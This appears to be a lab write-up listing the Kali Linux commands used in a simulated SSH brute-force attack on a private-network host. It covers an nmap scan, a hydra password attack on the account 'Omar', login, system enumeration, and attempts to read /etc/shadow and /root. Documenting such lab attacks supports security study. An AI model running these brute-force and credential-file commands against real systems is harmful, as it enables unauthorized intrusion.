# Attacker Commands

This document lists the commands executed from the Kali Linux attacker machine during the simulated SSH brute-force attack.

## Network Reconnaissance

```bash
nmap -sV 192.168.81.130
```

Scans the target to identify open ports and running services.

---

## Create Password List

```bash
touch passwords.txt
```

Creates an empty password list.

```bash
nano passwords.txt
```

Opens the password list for editing.

---

## SSH Brute Force

```bash
hydra -l Omar -P passwords.txt ssh://192.168.81.130
```

Performs a brute-force attack against the SSH service using the provided password list.

---

## SSH Login

```bash
ssh Omar@192.168.81.130
```

Logs into the target system using the compromised credentials.

---

## User Enumeration

```bash
whoami
hostname
pwd
id
groups
sudo -l
ls -la
cat /etc/passwd
cat /etc/os-release
uname -a
history
```

Collects information about the current user and system.

---

## File Operations

```bash
touch notes.txt
echo "Incident Test" > notes.txt
cat notes.txt
```

Creates and verifies a test file.

---

## Privilege Escalation Attempts

```bash
cd /root
cat /etc/shadow
```

Attempts to access privileged resources.

---

## Logout

```bash
exit
```

Terminates the SSH session.

